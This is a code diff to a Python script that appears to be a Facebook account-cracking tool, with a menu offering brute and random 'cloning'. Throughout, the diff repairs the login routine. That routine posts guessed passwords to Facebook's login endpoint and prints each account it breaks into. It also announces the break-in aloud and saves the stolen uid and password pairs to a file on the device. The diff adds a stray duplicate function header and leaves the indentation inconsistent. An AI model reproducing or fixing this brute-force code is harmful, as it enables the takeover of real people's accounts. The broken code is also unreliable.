@@ -683,6 +683,7 @@ def main():
             + animation[i % len(animation)] + "\033[1;97m ")
         sys.stdout.flush()
 	    
+def main():	    
     clear()
     print(
         f'\x1b[38;5;46m[\033[1;97m1\x1b[38;5;46m] \033[1;97mBRUTE_CLONING \x1b[38;5;46m[\x1b[38;5;46m2009\x1b[38;5;46m/\x1b[38;5;46m2009-2010\x1b[38;5;46m]\033[1;97m'
@@ -715,7 +716,7 @@ elif ch in ('4', '04', '33', 'd', 'D'):
     RANDOM_CLONING()
 elif ch in ('5', '05'):
     print("Exiting program...")
-    exit():
+    exit()
  
 def BRUTE_CLONING():
     user=[]
@@ -845,17 +846,21 @@ def login1(uid):
             'Content-Length': '706'}
             url = "https://b-graph.facebook.com/auth/login"
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
-            if "session_key" in rp:            	
-    print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-    open("/sdcard/BRUTE_CLONING-OK.txt","a").write(uid+"|"+pw+"\n")
-    oks.append(uid)
-    break
-elif "www.facebook.com" in rp['error']['message']:
-    cps.append(uid)
-    break
-else:continue
-loop+=1
-except Exception as e:time.sleep(30)
+     if "session_key" in rp:
+        print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m')
+        os.system('espeak -a 300 " Cracked Ok id,"')
+        open("/sdcard/BRUTE_CLONING-OK.txt","a").write(uid+"|"+pw+"\n")
+        oks.append(uid)
+        break
+    elif "www.facebook.com" in rp['error']['message']:
+        cps.append(uid)
+        break
+    else:
+        loop += 1
+        continue
+except Exception as e:
+    time.sleep(30)           
+
 def login2(uid):
     global oks,loop,cps
     Session=requests.session()
